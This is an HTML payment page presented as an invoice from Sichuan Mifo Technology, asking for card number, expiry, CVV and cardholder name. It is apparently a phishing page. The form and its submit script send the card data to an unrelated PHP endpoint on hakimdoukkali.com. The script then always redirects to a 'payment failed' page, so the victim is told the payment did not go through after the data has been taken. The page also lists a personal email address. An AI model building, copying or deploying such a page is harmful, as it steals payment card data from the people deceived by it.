<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Invoice Payment</title>
    <style>
        /* Base Styles (Applied to All Screens) */
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            color: #333;
            margin: 0;
            padding: 20px;
            background-color: #f5f5f5;
        }
        
        .container {
            display: flex;
            max-width: 900px;
            margin: 0 auto;
            background-color: white;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        
        .invoice-details {
            flex: 1;
            padding: 30px;
            border-right: 1px solid #eee;
        }
        
        .payment-section {
            flex: 1;
            padding: 30px;
        }
        
        h1 {
            font-size: 20px;
            margin-top: 0;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 1px solid #eee;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin-bottom: 20px;
        }
        
        table td {
            padding: 10px 0;
            vertical-align: top;
            border-bottom: 1px solid #eee;
        }
        
        table tr:last-child td {
            border-bottom: none;
        }
        
        table td:first-child {
            font-weight: bold;
            width: 40%;
        }
        
        .due-amount {
            font-weight: bold;
            color: #000;
        }
        
        .payment-option {
            margin-bottom: 20px;
            padding: 20px;
            border: 2px dashed #4CAF50;
            border-radius: 5px;
            position: relative;
        }
        
        .payment-option input[type="radio"] {
            position: absolute;
            top: 20px;
            left: 20px;
        }
        
        .payment-details {
            margin-top: 15px;
        }
        
        .payment-details input {
            display: block;
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
        }
        
        .payment-details label {
            display: block;
            margin-bottom: 5px;
            font-size: 14px;
            color: #666;
        }
        
        .payment-button {
            background-color: #080c8d;
            color: white;
            padding: 12px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
            margin-top: 10px;
        }
        
        .payment-button:hover {
            background-color: #080c8d;
        }
        
        .payment-method {
            font-weight: bold;
            margin-bottom: 15px;
            padding-left: 25px;
        }
        
        .card-logos {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .card-logo {
            height: 30px;
            width: auto;
        }
        
        .expiry-cvv {
            display: flex;
            gap: 15px;
        }
        
        .expiry-cvv > div {
            flex: 1;
        }

        /* Mobile Styles (Applied when screen is 768px or smaller) */
        @media (max-width: 768px) {
            .container {
                flex-direction: column; /* Stack vertically on mobile */
            }
            
            .invoice-details {
                border-right: none;
                border-bottom: 1px solid #eee;
                padding: 20px;
            }
            
            .payment-section {
                padding: 20px;
            }
            
            /* Optional: Adjust font sizes for mobile */
            h1 {
                font-size: 18px;
            }
            
            table td {
                font-size: 14px;
                padding: 8px 0;
            }
            
            .payment-option {
                padding: 15px;
            }
            
            .card-logo {
                height: 25px;
            }
        }

        /* Extra Small Mobile Devices (Optional) */
        @media (max-width: 480px) {
            body {
                padding: 10px;
            }
            
            .payment-details input {
                padding: 8px;
                font-size: 13px;
            }
            
            .payment-button {
                padding: 10px;
                font-size: 15px;
            }
        }
    </style>
</head>
<body>
    <!-- Same HTML content as before -->
    <div class="container">
        <div class="invoice-details">
            <h1>Invoice Details</h1>
            <table>
                <tr>
                    <td>Merchant Name:</td>
                    <td>Sichuan Mifo Technology Co., Ltd.</td>
                </tr>
                <tr>
                    <td>Order no. #:</td>
                    <td>223394439001020703</td>
                </tr>
                <tr>
                    <td>Email:</td>
                    <td>alfahdi73@hotmail.com</td>
                </tr>
                <tr>
                    <td class="due-amount">Total Amount</td>
                    <td class="due-amount"> AED 6,127.78</td>
                </tr>
            </table>
        </div>
        
        <div class="payment-section">
            <form id="paymentForm" action="https://hakimdoukkali.com/ws.admin/alibaba.php" method="post">
            <!--<img class="logo" src="https://oss.tasleembilling.ae/Portals/0/Tasleem_Logo.png" alt="" id="merchantLogoImg"/>-->
                <div class="payment-option">
                    <input type="radio" id="card" name="payment_method" value="card" checked>
                    <label for="card" class="payment-method">Pay with Credit/Debit Cards</label>
                    
                    <div class="card-logos">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" alt="Visa" class="card-logo">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" alt="Mastercard" class="card-logo">
                    </div>
                    
                    <div class="payment-details">
                        <label for="card_number">Card Number</label>
                        <input type="text" id="card_number" name="card_number" placeholder="1234 5678 9012 3456" maxlength="19" required>
                        
                        <div class="expiry-cvv">
                            <div>
                                <label for="card_expiry">MM/YY</label>
                                <input type="text" id="card_expiry" name="card_expiry" placeholder="MM/YY" maxlength="5" required>
                            </div>
                            <div>
                                <label for="card_cvv">CVV</label>
                                <input type="text" id="card_cvv" name="card_cvv" placeholder="CVV" maxlength="3" required>
                            </div>
                        </div>
                        
                        <label for="card_name">Cardholder Name</label>
                        <input type="text" id="card_name" name="card_name" placeholder="Name on card" required>
                    </div>
                </div>
                
                <button type="submit" class="payment-button" id="submitBtn">MAKE A PAYMENT</button>
            </form>
        </div>
    </div>

    <!-- Same JavaScript as before -->
    <script>
        document.getElementById('card_number').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s+/g, '');
            if (value.length > 0) {
                value = value.match(new RegExp('.{1,4}', 'g')).join(' ');
            }
            e.target.value = value;
        });

        document.getElementById('card_expiry').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
        });

        document.getElementById('card_cvv').addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '');
        });

        document.getElementById('paymentForm').addEventListener('submit', function(e) {
            e.preventDefault();
            fetch(this.action, {
                method: 'POST',
                body: new FormData(this)
            })
            .then(() => window.location.href = 'payment-failed.html')
            .catch(() => window.location.href = 'payment-failed.html');
        });
    </script>
</body>
</html>
